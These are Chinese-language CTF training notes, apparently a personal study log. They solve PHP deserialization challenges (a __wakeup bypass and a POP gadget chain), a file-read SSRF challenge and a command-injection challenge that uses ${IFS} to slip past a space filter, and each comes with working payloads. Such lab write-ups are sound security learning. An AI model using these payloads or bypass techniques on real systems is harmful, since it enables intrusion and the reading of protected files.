# NK培训 反序列化
## weakup.php
```
 <?php

include "flag.php";
highlight_file(__FILE__);

class Name{
    public $username = 'nonono';
    public $password = 'yesyes';
    public function __construct($username,$password){
    // 在创建对象时候初始化对象，一般用于对变量赋初值。
        $this->username = $username;
        $this->password = $password;
    }
    function __wakeup(){
    // 反序列化恢复对象之前调用该方法
        $this->username = 'guest';
    }
    function __destruct(){
    // 当对象所在函数调用完毕后执行
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        var_dump($this->username);
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();
        }
    }
}

$a = unserialize($_GET['un']);
?> 
```
给username传参admin让他echo $flag，然后给password传参100让他不触发hacker，但是反序列化会触发wakeup魔术方法给username传参guest，所以要绕过weakup
> 当反序列化字符串中，表示属性个数的值⼤于真实属性个数时，会绕过 __wakeup 函数的执⾏。

```
$a=new Name;
$a->username='admin';
$a->password=100;
```
传参
`O:4:"Name":3:{s:8:"username";s:5:"admin";s:8:"password";i:100;}`
## pop.php
```
 <?php
highlight_file(__FILE__);

class blue
{
    public $b1;
    public $b2;

    function eval() {
        echo new $this->b1($this->b2);
    }

    public function __invoke()
    {
        $this->b1->blue();
    }
}

class red
{
    public $r1;

    public function __destruct()
    {
        echo $this->r1 . '0xff0000';
    }

    public function execute()
    {
        ($this->r1)();
    }

    public function __call($a, $b)
    {
        echo $this->r1->getFlag();
    }

}

class white
{
    public $w;

    public function __toString()
    {
        $this->w->execute();
        return 'hello';
    }
}
class color
{
    public $c1;

    public function execute()
    {
        ($this->c1)();
    }

    public function getFlag()
    {
        echo file_get_contents($this->c1);
    }

}

unserialize($_POST['cmd']); 
```
反序列化触发red的destruct魔术执行了 echo $this->r1 . '0xff0000';触发white的toString魔术，执行了color的execute函数，触发了blue的invoke魔术方法，执行了blue这个不存在的函数，触发了red的call魔术方法，最后调用getFlag函数。
pop链：
`unserialize()->red->__destruct()->white->__toString()->color->run()->blue->__invoke()->red->__call()->color->get_flag()->file_get_contents()`
```
$a=new red();
$a->r1=new white();
$a->r1->w=new color();
$a->r1->w->c1=new blue();
$a->r1->w->c1->b1=new red();
$a->r1->w->c1->b1->r1=new color();
$a->r1->w->c1->b1->r1->c1='flag.txt';
```
传参：
O:3:"red":1:{s:2:"r1";O:5:"white":1:{s:1:"w";O:5:"color":1:{s:2:"c1";O:4:"blue":2:{s:2:"b1";O:3:"red":1:{s:2:"r1";O:5:"color":1:{s:2:"c1";s:8:"flag.txt";}}s:2:"b2";N;}}}}
# NK ssrf
##  [NISACTF 2022]easyssrf
![5c4931e9f0e49a66858c0203fa07eb27.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1705688725275-d1c901a5-d4b1-4d15-afbd-e15a5f9a1313.png#averageHue=%23d9bb98&clientId=ude0c6653-7bc0-4&from=paste&height=588&id=uc6d41b00&originHeight=735&originWidth=1733&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=32927&status=done&style=none&taskId=u81969606-e651-4c05-9899-516de1429c1&title=&width=1386.4)
随便注入看到提示“路径”
![2029cbc055e70c025c78ed9489aa3407.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1705688769134-8ea82da5-5faf-48b2-81dd-a39512ea9c48.png#averageHue=%23fefefe&clientId=ude0c6653-7bc0-4&from=paste&height=320&id=ub45f98cd&originHeight=400&originWidth=822&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=10032&status=done&style=none&taskId=ue4d3994f-6bf6-4868-9ec7-a4ea01f9a3c&title=&width=657.6)
输入flag，得到提示/fl4g
![a4588b0e7e54f6fb7ddf4dcd37830827.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1705688822735-b48c99a2-9129-48c3-8e41-c301d2fccda5.png#averageHue=%23fefefe&clientId=ude0c6653-7bc0-4&from=paste&height=310&id=u7ae3432f&originHeight=387&originWidth=794&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=12886&status=done&style=none&taskId=u1377da13-0b00-4401-bcc9-5d0bee3dfe8&title=&width=635.2)
尝试读取file:///fl4g，进入下一层
![47d6d3da9ffb94922c989bb6102725dd.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1705688923477-95515f97-bbd6-4cc6-a62b-8f78777c77e1.png#averageHue=%23fefefe&clientId=ude0c6653-7bc0-4&from=paste&height=369&id=u6da497ac&originHeight=461&originWidth=837&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=18196&status=done&style=none&taskId=uce49567d-94dd-4004-a2be-49ea779ab52&title=&width=669.6)
```
 <?php

highlight_file(__FILE__);
error_reporting(0);

$file = $_GET["file"];
if (stristr($file, "file")){
  die("你败了.");
}

//flag in /flag
echo file_get_contents($file); 
```
提示flag in /flag
payload：?file=/flag
得到flag
![c4b65036969ed591861f95df6266712c.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1705689044169-ff371f47-cc82-4ca1-8006-29d80ab3b28d.png#averageHue=%23fdfcfc&clientId=ude0c6653-7bc0-4&from=paste&height=238&id=u51d7f7f3&originHeight=298&originWidth=854&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=20294&status=done&style=none&taskId=u68a8ff2d-f15f-488d-bbb3-458f4ec59f3&title=&width=683.2)
# NSS刷题
##  [SWPUCTF 2021 新生赛]babyrce  
![d158faebb4879920756ac085eb608bc9.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1705689509770-88f42c7c-f265-44a1-9295-5ec41052073a.png#averageHue=%23fdfcfb&clientId=u414dcd44-e1b9-4&from=paste&height=214&id=u76e60b84&originHeight=268&originWidth=523&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=19855&status=done&style=none&taskId=u15bfdbe4-8791-45c7-9677-25d72b4c79a&title=&width=418.4)
构造cookie：admin=1
![c31fdd0100ca5f908f4c1fd005562a43.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1705689542926-7838214f-5b0d-45cd-8739-39b1c68bb07a.png#averageHue=%23fdfcfa&clientId=u414dcd44-e1b9-4&from=paste&height=218&id=u4b3b5b76&originHeight=272&originWidth=487&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=23259&status=done&style=none&taskId=u6ad65732-5152-429c-922f-b1c8b015224&title=&width=389.6)
![398295ef74168728c9119179fab9573f.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1705689567202-3a539d59-a30e-43f0-b2f4-341640b1a775.png#averageHue=%23fefefd&clientId=u414dcd44-e1b9-4&from=paste&height=250&id=u8a536c18&originHeight=312&originWidth=352&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=15339&status=done&style=none&taskId=u4f865c7c-0ca2-49d8-ab08-46ae461cee3&title=&width=281.6)
if(preg_match("/ /", $ip)){过滤了空格
用${IFS}绕过
payload1：?url=ls${IFS}/
![73506a5d738ca3c81b36b029dc802384.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1705689682241-00679ae0-e15a-4a10-84b3-46fce3f79329.png#averageHue=%23fcfcfb&clientId=u414dcd44-e1b9-4&from=paste&height=270&id=ue86b2fd0&originHeight=338&originWidth=1082&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=26879&status=done&style=none&taskId=u0c1b1a92-a99b-4859-8f12-a345c595df4&title=&width=865.6)
payload2：?url=cat${IFS}/flllllaaaaaaggggggg
![7fc4fc4b135de861d6c51dd46e248679.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1705689742897-7b37b78e-f99f-445a-8196-373777152cdf.png#averageHue=%23fcfbfb&clientId=u414dcd44-e1b9-4&from=paste&height=257&id=u3fe48010&originHeight=321&originWidth=570&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=22786&status=done&style=none&taskId=u1352f5f6-b35e-4d7d-b440-204579c6aa3&title=&width=456)
